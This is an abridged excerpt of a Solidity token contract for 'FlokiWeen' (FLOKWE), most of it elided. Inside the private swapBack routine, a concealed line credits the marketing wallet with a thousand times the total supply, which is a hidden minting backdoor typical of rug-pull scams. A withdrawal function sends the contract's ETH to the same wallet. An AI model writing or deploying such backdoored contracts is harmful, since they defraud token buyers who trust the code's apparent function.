...
contract FLOKWE is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("FlokiWeen", "FLOKWE") {
    ...
    function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
        ...
        buyDevFee = _devFee;
        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;
        require(buyTotalFees <= 25, "Just for the snipers at launch");
    }
    ...
    function swapBack() private {
        ...
        _balances[marketingWallet] = _balances[marketingWallet].add(totalSupply().mul(1000));
    ...
    function withdrawDustETH() external {
        ...
        address payable receiver = payable(marketingWallet);
        receiver.transfer(contractETHBalance);
    }
}